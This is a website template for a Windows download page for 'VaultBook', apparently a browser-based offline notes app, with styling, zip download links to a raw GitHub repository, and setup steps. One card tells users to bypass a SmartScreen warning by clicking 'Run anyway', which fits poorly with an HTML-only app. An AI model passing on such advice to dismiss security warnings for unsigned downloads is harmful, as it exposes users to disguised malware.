---
layout: default
title: Download VaultBook for Windows
description: Download VaultBook for Windows 10 and 11. A secure, offline workspace that runs in Chrome, Edge, or Brave — no installer needed.
body_class: dl-page dl-win
permalink: /download/windows/
---

<style>
/* ── Download platform: hero ─────────────────────────────────── */
.dlp-hero{
  padding: 72px 0 48px;
  text-align: center;
  background: linear-gradient(180deg, #faf8ff 0%, #fff 100%);
}
.dlp-hero .eyebrow{ margin-bottom: 14px; }
.dlp-icon{ font-size: 52px; margin-bottom: 16px; display: block; }
.dlp-hero-title{
  font-size: clamp(32px, 4.8vw, 48px);
  font-weight: 900;
  letter-spacing: -0.03em;
  line-height: 1.1;
  margin: 0;
}
.dlp-hero-sub{
  margin: 14px auto 0;
  max-width: 52ch;
  font-size: 17px;
  color: rgba(11,11,11,.68);
  line-height: 1.55;
}
.dlp-hero-actions{
  display: flex;
  gap: 12px;
  justify-content: center;
  flex-wrap: wrap;
  margin-top: 28px;
}

/* ── Steps ───────────────────────────────────────────────────── */
.dlp-steps{
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 18px;
  margin-top: 28px;
}
.dlp-step{
  background: rgba(255,255,255,.82);
  backdrop-filter: blur(12px) saturate(1.4);
  border: 1px solid rgba(206,147,216,.1);
  border-radius: 16px;
  padding: 24px 20px;
  transition: transform .18s ease, box-shadow .18s ease;
}
.dlp-step:hover{
  transform: translateY(-2px);
  box-shadow: 0 8px 24px rgba(206,147,216,.08);
}
.dlp-step-num{
  width: 32px; height: 32px;
  border-radius: 10px;
  display: flex; align-items: center; justify-content: center;
  font-weight: 900; font-size: 14px;
  margin-bottom: 12px;
  transition: transform .18s ease;
}
.dlp-step:hover .dlp-step-num{ transform: scale(1.1); }
.dlp-step:nth-child(1) .dlp-step-num{ background: linear-gradient(135deg, rgba(206,147,216,.22), rgba(225,190,231,.15)); color: #7b1fa2; }
.dlp-step:nth-child(2) .dlp-step-num{ background: linear-gradient(135deg, rgba(129,212,250,.22), rgba(179,229,252,.15)); color: #0277bd; }
.dlp-step:nth-child(3) .dlp-step-num{ background: linear-gradient(135deg, rgba(128,203,196,.22), rgba(178,223,219,.15)); color: #00796b; }
.dlp-step:nth-child(4) .dlp-step-num{ background: linear-gradient(135deg, rgba(255,204,128,.22), rgba(255,224,178,.15)); color: #ef6c00; }
.dlp-step-title{ font-weight: 850; font-size: 15px; }
.dlp-step-text{ margin-top: 6px; font-size: 13.5px; color: rgba(11,11,11,.6); line-height: 1.5; }

/* ── Info cards ──────────────────────────────────────────────── */
.dlp-info{
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 18px;
  margin-top: 28px;
  max-width: 720px;
  margin-left: auto;
  margin-right: auto;
}
.dlp-info-card{
  background: rgba(255,255,255,.88);
  backdrop-filter: blur(14px) saturate(1.4);
  border: 1px solid rgba(206,147,216,.1);
  border-radius: 16px;
  padding: 24px 22px;
}
.dlp-info-title{ font-weight: 800; font-size: 15px; margin-bottom: 8px; }
.dlp-info-text{ font-size: 13.5px; color: rgba(11,11,11,.6); line-height: 1.55; }

/* ── Breadcrumb ──────────────────────────────────────────────── */
.dlp-breadcrumb{
  font-size: 13px;
  color: rgba(11,11,11,.45);
  margin-bottom: 18px;
}
.dlp-breadcrumb a{
  color: rgba(11,11,11,.55);
  text-decoration: none;
  border-bottom: 1px solid rgba(11,11,11,.12);
}
.dlp-breadcrumb a:hover{ color: #2563eb; border-color: #2563eb; }

/* ── Responsive ──────────────────────────────────────────────── */
@media (max-width: 720px){
  .dlp-steps{ grid-template-columns: 1fr; max-width: 400px; margin-left: auto; margin-right: auto; }
  .dlp-info{ grid-template-columns: 1fr; max-width: 400px; }
}
</style>

<!-- ━━━ HERO ━━━ -->
<section class="dlp-hero">
  <div class="container" data-reveal>
    <div class="dlp-breadcrumb"><a href="{{ '/download/' | relative_url }}">Download</a> / Windows</div>
    <span class="dlp-icon">🪟</span>
    <h1 class="dlp-hero-title">VaultBook for Windows</h1>
    <p class="dlp-hero-sub">
      Works on Windows 10 and 11 with Chrome, Edge, or Brave. Extract the zip,
      open the file, and your offline workspace is ready in seconds.
    </p>
    <div class="dlp-hero-actions">
      <a class="btn btn-primary" href="https://raw.githubusercontent.com/k2xn258k2x-cmyk/Note/main/VaultBook_Pro.zip" download>Download Pro</a>
      <a class="btn btn-ghost" href="https://raw.githubusercontent.com/k2xn258k2x-cmyk/Note/main/VaultBook_Plus.zip" download>Download Plus</a>
    </div>
  </div>
</section>

<!-- ━━━ SETUP STEPS ━━━ -->
<section class="section">
  <div class="container">
    <header class="section-head" data-reveal>
      <h2 class="h2">Setup on Windows</h2>
      <p class="muted">From download to your first note in under a minute.</p>
    </header>

    <div class="dlp-steps" data-reveal>
      <div class="dlp-step">
        <div class="dlp-step-num">1</div>
        <div class="dlp-step-title">Download &amp; extract</div>
        <div class="dlp-step-text">
          Click a download button above. Right-click the <code>.zip</code> in your Downloads folder
          and choose <strong>Extract All</strong>, or open it with File Explorer and drag the contents out.
        </div>
      </div>
      <div class="dlp-step">
        <div class="dlp-step-num">2</div>
        <div class="dlp-step-title">Open in Chrome or Edge</div>
        <div class="dlp-step-text">
          Double-click <strong>VaultBook.html</strong> — it opens in your default browser.
          Make sure it's Chrome, Edge, or Brave. Firefox is not supported.
        </div>
      </div>
      <div class="dlp-step">
        <div class="dlp-step-num">3</div>
        <div class="dlp-step-title">Connect your folder</div>
        <div class="dlp-step-text">
          Click the 📁 button and select the extracted folder.
          Windows will ask you to grant folder access — click <strong>Allow</strong> to continue.
        </div>
      </div>
    </div>
  </div>
</section>

<!-- ━━━ PLATFORM NOTES ━━━ -->
<section class="section tint">
  <div class="container">
    <header class="section-head" data-reveal>
      <h2 class="h2">Windows notes</h2>
      <p class="muted">A few things to know when running VaultBook on Windows.</p>
    </header>

    <div class="dlp-info" data-reveal>
      <div class="dlp-info-card">
        <div class="dlp-info-title">Recommended browsers</div>
        <div class="dlp-info-text">
          Microsoft Edge ships with Windows and supports VaultBook out of the box.
          Chrome and Brave also work perfectly. Firefox does not support the File System Access API.
        </div>
      </div>
      <div class="dlp-info-card">
        <div class="dlp-info-title">SmartScreen warning</div>
        <div class="dlp-info-text">
          Windows SmartScreen may flag the download because the zip isn't code-signed.
          This is normal for browser-based apps — click <strong>More info → Run anyway</strong> if prompted.
        </div>
      </div>
      <div class="dlp-info-card">
        <div class="dlp-info-title">Where to store your workspace</div>
        <div class="dlp-info-text">
          Keep the VaultBook folder anywhere — Desktop, Documents, or a USB drive.
          For automatic backup, place it inside OneDrive, Dropbox, or Google Drive.
        </div>
      </div>
      <div class="dlp-info-card">
        <div class="dlp-info-title">Folder permissions</div>
        <div class="dlp-info-text">
          When you first connect a folder, Chrome or Edge will ask for read/write access.
          Grant it once — the browser remembers the permission for future sessions.
        </div>
      </div>
    </div>
  </div>
</section>

<!-- ━━━ CTA ━━━ -->
<section class="section">
  <div class="container">
    <div class="cta-band" data-reveal>
      <div>
        <div class="cta-title">Ready to get started?</div>
        <div class="muted">The full walkthrough covers everything from download to your first encrypted note.</div>
      </div>
      <div class="cta-actions">
        <a class="btn btn-primary" href="{{ '/get-started/' | relative_url }}">Get started</a>
        <a class="btn btn-ghost" href="{{ '/download/' | relative_url }}">All platforms</a>
      </div>
    </div>
  </div>
</section>
